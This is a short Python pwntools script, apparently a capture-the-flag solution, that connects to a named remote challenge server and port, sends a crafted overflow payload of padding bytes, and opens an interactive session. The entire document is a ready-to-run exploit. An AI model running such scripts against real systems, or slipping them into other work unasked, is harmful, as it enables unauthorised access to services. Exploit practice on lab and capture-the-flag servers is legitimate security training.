from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 25161

s = remote(SERVER, PORT, timeout=9999)
s.sendline(b'a'*0x8 + b'b' * 0x28 + b'a'*0x8 + b'\n')
s.interactive()